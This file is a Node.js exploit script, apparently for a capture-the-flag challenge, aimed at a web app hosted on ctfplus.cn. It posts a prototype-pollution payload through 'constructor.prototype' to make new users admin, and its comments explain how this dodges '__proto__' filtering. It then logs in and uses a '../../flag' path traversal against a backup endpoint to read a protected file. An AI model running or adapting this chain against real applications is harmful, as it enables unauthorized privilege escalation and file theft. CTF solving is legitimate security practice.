
const http = require('http');
const querystring = require('querystring');

// 💥 FINAL EXPLANATION:
// When merge(source, target):
// - if (source[key] instanceof Object && key in target) → merge recursively
// - "constructor" is always in target because it exists on the prototype, so key in target → true!
// - So we get merge(target.constructor, source.constructor) → target.constructor already is Object, so then merge(target.constructor.prototype, source.constructor.prototype)
// - target.constructor.prototype IS Object.prototype! So we add role:admin to Object.prototype directly!
// - And __proto__ is not mentioned at all, so no filtering triggered!

console.log("🚀 FINAL ATTEMPT: constructor.prototype.role = admin on registration, no filtering, correct recursion, pollutes Object.prototype.role = admin!");

const postData = querystring.stringify({
  "username": "ultimatewin",
  "constructor": {
    "prototype": {
      "role": "admin"
    }
  }
});

const opts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/register',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(postData)
  }
};

const req = http.request(opts, (res) => {
  let body = '';
  res.on('data', chunk => body += chunk);
  res.on('end', () => {
    console.log("Registration done:");
    console.log(body);
    let match = body.match(/<span.*?>([a-f0-9]+)<\/span>/);
    if (match) {
      const uid = match[1];
      console.log(`\n✅ Registered UID: ${uid}`);
      console.log("✅ Object.prototype.role is NOW 'admin'! New users will inherit it!");
      console.log("👉 Logging in...");
      loginAndGetFlag(uid);
    }
  });
});

req.on('error', err => console.error(err));
req.write(postData);
req.end();

function loginAndGetFlag(uid) {
  const loginData = querystring.stringify({uid: uid});
  const loginOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(loginData)
    }
  };

  const req = http.request(loginOpts, (res) => {
    const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
    console.log("✅ Logged in, checking profile...");
    const profileData = JSON.stringify({uid: uid});
    const profileOpts = {
      hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
      port: 80,
      path: '/api/profile',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(profileData),
        'Cookie': cookie
      }
    };

    const profileReq = http.request(profileOpts, (profileRes) => {
      let body = '';
      profileRes.on('data', chunk => body += chunk);
      profileRes.on('end', () => {
        console.log("\n📄 Profile response:");
        console.log(body);
        try {
          const json = JSON.parse(body);
          console.log("\n🔍 Role:", json.role);
          if (json.role === 'admin') {
            console.log("\n🎉 SUCCESS! WE ARE ADMIN! GETTING FLAG...");
            const flagData = querystring.stringify({file: '../../flag'});
            const flagOpts = {
              hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
              port: 80,
              path: '/api/backup',
              method: 'POST',
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(flagData),
                'Cookie': cookie
              }
            };
            const flagReq = http.request(flagOpts, (flagRes) => {
              let flagBody = '';
              flagRes.on('data', chunk => flagBody += chunk);
              flagRes.on('end', () => {
                console.log("\n🏁 🏁 🏁  FINAL FLAG:");
                console.log(flagBody);
              });
            });
            flagReq.write(flagData);
            flagReq.end();
          }
        } catch(e) {
          console.log("❌ Error parsing JSON: ", e);
        }
      });
    });
    profileReq.write(profileData);
    profileReq.end();
  });

  req.on('error', err => console.error(err));
  req.write(loginData);
  req.end();
}
